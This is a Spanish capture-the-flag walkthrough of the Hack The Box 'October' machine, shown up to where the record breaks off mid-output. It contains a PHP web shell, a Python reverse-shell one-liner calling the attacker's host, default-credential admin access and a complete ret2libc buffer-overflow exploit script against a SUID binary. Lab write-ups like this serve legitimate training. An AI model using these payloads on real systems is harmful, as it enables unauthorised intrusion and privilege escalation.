---
title: Hack The Box October
author: k4miyo
date: 2021-09-21
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [PHP]
ping: true
---

## October
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.16.

```bash
❯ ping -c 1 10.10.10.16
PING 10.10.10.16 (10.10.10.16) 56(84) bytes of data.
64 bytes from 10.10.10.16: icmp_seq=1 ttl=63 time=140 ms

--- 10.10.10.16 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.771/139.771/139.771/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.16 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 21:39 CDT
Initiating SYN Stealth Scan at 21:39
Scanning 10.10.10.16 [65535 ports]
Discovered open port 80/tcp on 10.10.10.16
Discovered open port 22/tcp on 10.10.10.16
Completed SYN Stealth Scan at 21:40, 26.91s elapsed (65535 total ports)
Nmap scan report for 10.10.10.16
Host is up, received user-set (0.30s latency).
Scanned at 2021-09-20 21:39:45 CDT for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 30 (1.320KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.16
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,80 10.10.10.16 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 21:41 CDT
Nmap scan report for 10.10.10.16
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds
```

Vemos que se encuentra el servicio HTTP, por lo que ya sabemos que debemos de ver que tecnologías corren mediante el uso de la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.16
http://10.10.10.16 [200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

Algo que nos llama la atención es el título **October CMS - Vanilla** ya que hace referencia a un gestor de contenido. Investigando un poco, vemos que se trata de un CMS (gestor de contenido); por lo que es posible que tenga un panel de administracion asociado:

[stackoverflow.com](https://stackoverflow.com/questions/45815952/octobercms-how-to-open-admin-login-page)

Vemos que en el recurso `/backend` se debe encontrar el panel de adminsitración.

![""](/assets/images/htb-october/october-panel.png)

Y efectivamente, tenemos el panel de administración. Ahora, antes de tirar fuerza bruta o cualquier otra cosa, tenemos que ver si existen credenciales por defecto.

[octobercms.com](https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name)

Vemos que comentan que las credenciales son *admin:admin*; así que vamos a probarlas:

![""](/assets/images/htb-october/october-admin.png)

Ya estamos dentro del panel de administración del sitio web. Ahora debemos de buscar alguna forma de ingresar a la máquina víctima; si intentamos crear un archivo de extensión `php`, vemos que no nos deja; por lo tanto, tenemos que validar que extensiones permite el servidor. En la parte superior izquierda vemos varias opciones, podemos ingresar a **Media** y vemos algo curioso, un archivo de extensión `php5`; si lo seleccionamos vemos unas opciones del lado derecho y si le damos en ***Click here***, nos abre el recurso `dr.php5`.

Así que podemos crearnos un archivo con extensión `php5` y subirlo al servidor:

```bash
❯ cat k4mishell.php5
───────┬───────────────────────────────────────────────────────────
       │ File: k4mishell.php5
───────┼───────────────────────────────────────────────────────────
   1   │ <?php
   2   │     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
   3   │ ?>
```

![""](/assets/images/htb-october/october-shell.png)

Le damos en la opción ***Click here***, se nos abre otra ventana en donde se encuentra nuestro archivo php. Ahora mediante la variable `cmd` podemos ejecutar comandos a nivel de sistema.

![""](/assets/images/htb-october/october-cmd.png)

Ahora debemos entablarnos una reverse shell a nuestra máquina de atacante. Probando las reverse shell de [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), vemos que **Netcat** no nos deja, así que vamos por otras vías alternativas; como por ejemplo python. Antes de lanzar la reverse shell, vamos a validar si la máquina cuenta con python:

![""](/assets/images/htb-october/october-python.png)

Ahora si, lanzamos la reverse shell y nos ponemos en escucha por el puerto 443:

```bash
http://10.10.10.16/storage/app/media/k4mishell.php5?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.16%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.16] 49506
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

No encontramos dentro de la máquina como el usuario **www-data** y podemos visualizar la flag (user.txt). Como siempre, para trabajar más comodos, hacemos un [Tratamiento de la tty](/posts/tratamiento-tty). Ahora nos queda escalar privilegios y enumeramos un poco el sistema.

```bash
www-data@october:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@october:/$ sudo -l
[sudo] password for www-data: 
www-data@october:/$ cd /
www-data@october:/$ find \-perm -4000 2>/dev/null
./bin/umount
./bin/ping
./bin/fusermount
./bin/su
./bin/ping6
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/mtr
./usr/bin/chsh
./usr/bin/at
./usr/sbin/pppd
./usr/sbin/uuidd
./usr/local/bin/ovrflw
www-data@october:/$
```

Vemos un archivo curioso que tiene permisos SUID `/usr/local/bin/ovrflw`, que ya por el nombre nos hace referencia a *Buffer Overflow* y al ejecutarlo vemos que nos pide ingresar una cadena de texto.

```bash
www-data@october:/$ /usr/local/bin/ovrflw
Syntax: /usr/local/bin/ovrflw <input string>
www-data@october:/$
```

Validamos el archivo `randomize_va_space` y vemos que tiene un 2; por lo que el ***ASLR (Address Space Layout Randomization)*** se encuentra activado; lo que dispone de forma aleatoria las posiciones del espacio de direcciones de las áreas de datos clave de un proceso, incluyendo la base del ejecutable y las posiciones de la pila, el *heap* y las librerías.

```bash
www-data@october:/$ cat /proc/sys/kernel/randomize_va_space 
2
www-data@october:/$
```

Para el análisis del binario, vamos a hacer uso de la herramienta [peda](https://github.com/longld/peda).

```bash
❯ git clone https://github.com/longld/peda
Clonando en 'peda'...
remote: Enumerating objects: 382, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 382 (delta 2), reused 2 (delta 0), pack-reused 373
Recibiendo objetos: 100% (382/382), 290.84 KiB | 1.21 MiB/s, listo.
Resolviendo deltas: 100% (231/231), listo.
❯ tar -cf peda.tar peda
❯ ll
drwxr-xr-x root root 142 B  Tue Sep 21 00:47:20 2021  peda
.rw-r--r-- root root  65 B  Mon Sep 20 22:14:52 2021  k4mishell.php5
.rw-r--r-- root root 660 KB Tue Sep 21 00:47:39 2021  peda.tar
```

Ahora le pasamos el archivo `peda.tar` a la máquina víctima.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.16 - - [21/Sep/2021 00:49:51] "GET /peda.tar HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
❯ 
❯ md5sum peda.tar
0eb8ec6cc2974c84768b1ae816b6bf55  peda.tar
```

```bash
www-data@october:/dev/shm$ wget http://10.10.14.16/peda.tar
--2021-09-21 08:54:36--  http://10.10.14.16/peda.tar
Connecting to 10.10.14.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 675840 (660K) [application/x-tar]
Saving to: 'peda.tar'

100%[=======================================================================================>] 675,840      834KB/s   in 0.8s   

2021-09-21 08:54:37 (834 KB/s) - 'peda.tar' saved [675840/675840]

www-data@october:/dev/shm$ md5sum peda.tar 
0eb8ec6cc2974c84768b1ae816b6bf55  peda.tar
www-data@october:/dev/shm$
```

Descomprimimos el archivo transferido:

```bash
www-data@october:/dev/shm$ tar -xf peda.tar 
www-data@october:/dev/shm$ ls -la
total 660
drwxrwxrwt  3 root     root         80 Sep 21 08:56 .
drwxr-xr-x 20 root     root        680 Sep 21 08:14 ..
drwxr-xr-x  4 www-data www-data    200 Sep 21 08:47 peda
-rw-r--r--  1 www-data www-data 675840 Sep 21 08:47 peda.tar
www-data@october:/dev/shm$ 
```

Ahora instalamos `peda`:

```bash
www-data@october:/dev/shm$ echo $HOME

www-data@october:/dev/shm$ export HOME=/dev/shm
www-data@october:~$ echo $HOME
/dev/shm
www-data@october:~$ echo "source ~/peda/peda.py" >> ~/.gdbinit
www-data@october:~$ ls -la
total 664
drwxrwxrwt  3 root     root        100 Sep 21 08:59 .
drwxr-xr-x 20 root     root        680 Sep 21 08:14 ..
-rw-r--r--  1 www-data www-data     22 Sep 21 08:59 .gdbinit
drwxr-xr-x  4 www-data www-data    200 Sep 21 08:47 peda
-rw-r--r--  1 www-data www-data 675840 Sep 21 08:47 peda.tar
www-data@october:~$
www-data@october:~$ gdb
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
gdb-peda$ 
```

Procedemos al análisis del binario `/usr/local/bin/ovrflw`:

```bash
www-data@october:~$ gdb /usr/local/bin/ovrflw -q
Reading symbols from /usr/local/bin/ovrflw...(no debugging symbols found)...done.
gdb-peda$      
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$
gdb-peda$ info functions                                                                                                         
All defined functions:                                                                                                           

Non-debugging symbols:
0x080482f4  _init
0x08048330  printf@plt
0x08048340  strcpy@plt
0x08048350  __gmon_start__@plt
0x08048360  exit@plt
0x08048370  __libc_start_main@plt
0x08048380  _start
0x080483b0  __x86.get_pc_thunk.bx
0x080483c0  deregister_tm_clones 
0x080483f0  register_tm_clones
0x08048430  __do_global_dtors_aux
0x08048450  frame_dummy
0x0804847d  main
0x080484d0  __libc_csu_init
0x08048540  __libc_csu_fini
0x08048544  _fini
gdb-peda$
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804847d <+0>:     push   ebp
   0x0804847e <+1>:     mov    ebp,esp
   0x08048480 <+3>:     and    esp,0xfffffff0
   0x08048483 <+6>:     add    esp,0xffffff80
   0x08048486 <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
   0x0804848a <+13>:    jg     0x80484ad <main+48>
   0x0804848c <+15>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804848f <+18>:    mov    eax,DWORD PTR [eax]
   0x08048491 <+20>:    mov    DWORD PTR [esp+0x4],eax
   0x08048495 <+24>:    mov    DWORD PTR [esp],0x8048560
   0x0804849c <+31>:    call   0x8048330 <printf@plt>
   0x080484a1 <+36>:    mov    DWORD PTR [esp],0x0
   0x080484a8 <+43>:    call   0x8048360 <exit@plt>
   0x080484ad <+48>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b0 <+51>:    add    eax,0x4
   0x080484b3 <+54>:    mov    eax,DWORD PTR [eax]
   0x080484b5 <+56>:    mov    DWORD PTR [esp+0x4],eax
   0x080484b9 <+60>:    lea    eax,[esp+0x1c]
   0x080484bd <+64>:    mov    DWORD PTR [esp],eax
   0x080484c0 <+67>:    call   0x8048340 <strcpy@plt>
   0x080484c5 <+72>:    mov    eax,0x0
   0x080484ca <+77>:    leave  
   0x080484cb <+78>:    ret    
End of assembler dump.
gdb-peda$
```

Vemos que se encuentra habilitado ***NX***, el cual es como el ***DEP (Data Execution Prevention)*** de Windows que impide que una aplicación o servicio se ejecute desde una región de memoria no ejecutable; por lo tanto, no podemos cargar nuestro payload malicioso porque no se nos va a interpretar.

Además vemos el uso de la función `strcpy` el cual en caso de no estar sanitizada la entrada del usuario, puede ocacionar un buffer overflow. Esto lo podemos ver ejecutando el programa desde `peda`.

```bash
gdb-peda$ r $(python -c 'print "A"*500')                                                                                         
Starting program: /usr/local/bin/ovrflw $(python -c 'print "A"*500')                                                             
                                                                                                                                 
Program received signal SIGSEGV, Segmentation fault.                                                                             
[----------------------------------registers-----------------------------------]                                                 
EAX: 0x0 
EBX: 0xb7756000 --> 0x1abda8 
ECX: 0xbfc83e70 ('A' <repeats 13 times>)
EDX: 0xbfc82a43 ('A' <repeats 13 times>)
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbfc828d0 ('A' <repeats 200 times>...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbfc828d0 ('A' <repeats 200 times>...)
0004| 0xbfc828d4 ('A' <repeats 200 times>...)
0008| 0xbfc828d8 ('A' <repeats 200 times>...)
0012| 0xbfc828dc ('A' <repeats 200 times>...)
0016| 0xbfc828e0 ('A' <repeats 200 times>...)
0020| 0xbfc828e4 ('A' <repeats 200 times>...)
0024| 0xbfc828e8 ('A' <repeats 200 times>...)
0028| 0xbfc828ec ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
gdb-peda$ i r
eax            0x0      0x0
ecx            0xbf9c4e70       0xbf9c4e70
edx            0xbf9c3bf3       0xbf9c3bf3
ebx            0xb76f0000       0xb76f0000
esp            0xbf9c3a80       0xbf9c3a80
ebp            0x41414141       0x41414141
esi            0x0      0x0
edi            0x0      0x0
eip            0x41414141       0x41414141
eflags         0x10202  [ IF RF ]
cs             0x73     0x73
ss             0x7b     0x7b
ds             0x7b     0x7b
es             0x7b     0x7b
fs             0x0      0x0
gs             0x33     0x33
gdb-peda$
```

Como podemos ver, el programa nos manda la leyenda *Segmentation fault* y vemos que los registros `ebp` y `eip` han cambiado su valor por la cadena que le introducimos "*A - (0x41)*". Por lo tanto, necesitamos saber cual es el límite antes de cambiar los registros; ésto lo podemos lograr con el comando `pattern_create` desde `peda`:

 ```bash
gdb-peda$ pattern_create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
gdb-peda$
 ```

Ahora copiamos la cadena obtenida y la pasamos como argumento:

```bash
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8A
ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A
%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA
%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'  
Starting program: /usr/local/bin/ovrflw 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5
AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%n
A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%R
A%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsI
AseAs4AsJAsfAs5AsKAsgAs6A'                                                                                                       
                                                                                                                                 
Program received signal SIGSEGV, Segmentation fault.                                                                             
[----------------------------------registers-----------------------------------]                                                 
EAX: 0x0 
EBX: 0xb7783000 --> 0x1abda8 
ECX: 0xbfcdfe70 ("As5AsKAsgAs6A")
EDX: 0xbfcddc73 ("As5AsKAsgAs6A")
ESI: 0x0 
EDI: 0x0 
EBP: 0x6941414d ('MAAi')
ESP: 0xbfcddb00 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"...)
EIP: 0x41384141 ('AA8A')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41384141
[------------------------------------stack-------------------------------------]
0000| 0xbfcddb00 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"...)
0004| 0xbfcddb04 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
0008| 0xbfcddb08 ("AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%"...)
0012| 0xbfcddb0c ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"...)
0016| 0xbfcddb10 ("PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA"...)
0020| 0xbfcddb14 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)
0024| 0xbfcddb18 ("AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%Q"...)
0028| 0xbfcddb1c ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41384141 in ?? ()
gdb-peda$
```

Ahora, tomamos la última dirección que se nos muestra `0x41384141 in ?? ()` y ocupamos el comando `pattern_offset` para determinar la longitud del buffer antes de que se cambien los registros.

```bash
gdb-peda$ pattern_offset 0x41384141
1094205761 found at offset: 112
gdb-peda$ 
```

Para este caso, vemos que el buffer tiene un tamaño de 112; es decir,  que la longitud de caracteres antes de modificar el valor del registro `ebp` es de 112. Para modificar el valor del registro `eip` es el buffer(112) + ebp(4).

Checando las librerías compartidas del programa, vemos lo siguiente:

```bash
www-data@october:~$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb77fe000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7644000)
        /lib/ld-linux.so.2 (0x8003c000)
www-data@october:~$
```

En este caso, tenemos **libc**, por lo que debemos ya estar pensando en un ***Ret2libc***, que es una técnica que se basa en ejecutar código que no se encuentra en la pila sino en un sector de la memoria de libc, que es ejecutable; es decir, el código utilizado para vulnerar el programa son funciones dentro de esta librería. 

Una forma de ver el ASLR es ejecutando el comando `ldd` y podemos ver como las direcciones van cambiando, pero hay que tener en cuenta que las direcciones se repiten de forma aleatoria; esto es un punto importante que debemos tener en cuenta para la explotación del *Buffer Overflow*.

```bash
www-data@october:~$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb777b000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c1000)
        /lib/ld-linux.so.2 (0x80050000)
www-data@october:~$ ldd /usr/local/bin/ovrflw
        linux-gate.so.1 =>  (0xb7781000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c7000)
        /lib/ld-linux.so.2 (0x800dc000)
www-data@october:~$
www-data@october:~$ for i in $(seq 1 1000); do ldd /usr/local/bin/ovrflw; done | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xb75c7000
0xb75c7000
0xb75c7000
www-data@october:~$
```

Ahora, para nuestro script de *buffer overflow* debemos tener presente la siguiente secuencia de envío de datos:

![""](/assets/images/htb-october/october-ret2libc.png)

 - Junk: Los datos a introducir que llenan el buffer, para este caso son 112 caracteres.
 - Payload: Llamada a la librería *libc* la cual cuenta con funciones útiles. Esta se divide en tres partes:
   - System address: La dirección de la llamada a la función system.
   - Exit address: La dirección del código de estado.
   - Binario address: La dirección de la `/bin/sh` que utilizaremos para que **root** nos la ejecute.

Debido a que se está aplicando ASLR, debemos obtener la dirección base de *libc* que para este caso será `0xb75c7000` (este valor se obtiene ejecutando el comando `ldd`). Ahora debemos de obtener las direciones de las funciones *system address* y *exit address* a la librería *libc*.

```bash
www-data@october:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "\ssystem|\sexit"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:~$
```

Por útimo nos falta la dirección de la `/bin/sh` de la librería *libc*:

```bash
www-data@october:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"           
 162bac /bin/sh
www-data@october:~$ 
```

Retomando todo lo anterior, tenemos lo siguiente:
- offset = 112
- base_libc = 0xb75c7000
- junk = "A"*offset
- system_addr_offset = 0x00040310
- exit_addr_offset = 0x00033260
- bin_sh_addr_offset = 0x00162bac

Debido al ASLR, para calcular las direcciones reales para cuando *base_libc* vale `0xb75c7000` tenemos que sumarles dicho valor a los *offsets* de la funciones:
- system_addr = base_libc + system_addr_offset
- exit_addr = base_libc + exit_addr_offset
- bin_sh_addr = base_libc + bin_sh_addr_offset

Y el valor del payload completo sería:
- payload = junk + system_addr + exit_addr + bin_sh_addr

Ahora si, con todo esto, ya podemos armar nuestro programa en python:

```python
#!/usr/bin/python
import sys

from struct import pack
from subprocess import call

if __name__ == '__main__':
        base_libc = 0xb75c7000
        offset = 112
        junk = "A"*offset

        # ret2libc -> system_addr + exit_addr + bin_sh_addr
        system_addr_offset = 0x00040310
        exit_addr_offset = 0x00033260
        bin_sh_addr_offset = 0x00162bac

        system_addr = pack("<I", base_libc + system_addr_offset)
        exit_addr = pack("<I", base_libc + exit_addr_offset)
        bin_sh_addr = pack("<I", base_libc + bin_sh_addr_offset)

        payload = junk + system_addr + exit_addr + bin_sh_addr

        while True:
                ret = call(["/usr/local/bin/ovrflw", payload])
                if ret == 0:
                        print "\n[!] Saliendo..."
                        sys.exit(0)
```

Como el programa tiene permisos SUID, podemos ejecutarlo temporalmente como el propietario, en este caso **root**. Ejecutamos el script que hicimos y tenemos que esperar a que el valor de *libc* sea el que nosotros le indicamos; para este caso `0xb75c7000`. En caso de que llevemos un buen rato y no vemos el símbolo `#` de la `/bin/sh`, podríamos probar con otro valor de *libc* sin alterar el programa.

```bash
www-data@october:~$ python bof.py 
*** Error in `/usr/local/bin/ovrflw': munmap_chunk(): invalid pointer: 0xbff7fe7b ***
*** Error in `/usr/local/bin/ovrflw': free(): invalid pointer: 0x08048380 ***
*** Error in `/usr/local/bin/ovrflw': munmap_chunk(): invalid pointer: 0xbfb91e7b ***
Syntax: Z
         $$D$
              <input string>
ovrflw: uv
